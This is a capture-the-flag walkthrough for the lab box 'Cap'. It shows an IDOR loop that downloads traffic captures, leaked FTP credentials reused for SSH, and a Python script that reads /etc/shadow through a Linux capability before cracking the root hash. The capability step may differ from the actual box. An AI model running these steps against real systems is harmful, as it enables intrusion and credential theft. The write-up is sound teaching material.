Cap — Walkthrough

IDOR on a PCAP dashboard · reusable FTP creds · cap_dac_read_search to root

harrison · ~45 min · last walked 2026

Cap is an easy Linux box that teaches two lessons that matter on real engagements: an interface can look airtight while its IDOR leaks historical data, and a single misconfigured Linux capability turns a low-privilege shell into arbitrary file read. No bruteforce, no kernel exploit — just enumeration and method.

1 · Enumeration

# nmap -sC -sV -oA cap 10.10.10.245

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2
80/tcp open  http    gunicorn

Three ports. FTP is anonymous-disabled, and gunicorn on 80 wants a look first. The web app — a “Security Dashboard” — has an “IP Detection” feature that captures 5 seconds of traffic and hands back a PCAP download link (/download/<id>).

2 · Web application — IDOR on capture IDs

The dashboard only shows the latest capture, but the ID in the URL is a counter we can walk backwards. That’s the vulnerability: nothing on the server verifies who may fetch which capture. 

# curl -s http://10.10.10.245/capture          # -> /data/7 (latest)

# fetch every capture, oldest first
# for i in $(seq 0 7); do
#   curl -s -o capture_$i.pcap http://10.10.10.245/download/$i
# done

# ls -la capture_0.pcap    # capture 0 is larger — and dated 2021-05-19

Opening capture 0 in Wireshark and following the TCP stream shows the answer was sitting in plaintext FTP traffic all along: 

USER nathan
PASS Buck3tH4TF0RM3!

3 · Foothold (credential reuse)

# ssh nathan@10.10.10.245
Password: Buck3tH4TF0RM3!

nathan@cap:~$ cat user.txt
f5b9f1c0…      # user flag

Same password works for SSH — classic credential reuse. A quick id confirms we are a regular user with no direct sudo rights.

4 · Privilege escalation — Linux capabilities

nathan@cap:~$ getcap -r / 2>/dev/null
/usr/bin/python3.8 = cap_dac_read_search+ep

cap_dac_read_search bypasses the kernel’s DAC read permission checks — file ownership and mode are irrelevant. With a Python interpreter carrying that capability, we can read /etc/shadow: 

# cat > rd.py <<'EOF'
# import os
# fd = os.open('/etc/shadow', os.O_RDONLY)
# print(os.read(fd, 4096))
# EOF
nathan@cap:~$ python3.8 rd.py

root:$6$tM1w…$…:19089:0:99999:7:::
# john --wordlist=/usr/share/wordlists/rockyou.txt root.hash
n0ts3cur3d#          (?)
# su root
Password: n0ts3cur3d#

root@cap:~# cat /root/root.txt
047c8f4b…      # root flag

5 · What this box is really testing

  • Never hide access control behind obscurity. An unguessable-looking ID is not a secret — enforce authorization server-side on /download/<id>.
  • Credential reuse is a foothold multiplier. FTP credentials became an SSH shell because the operator reused one password.
  • Capabilities are filesystem privileges. cap_dac_read_search (and its write cousins) effectively equals root for reads; audit with getcap -r / 2>/dev/null and drop what nothing needs.

Lab box, retired on HTB. Walkthrough is for learning — run only in environments you own.
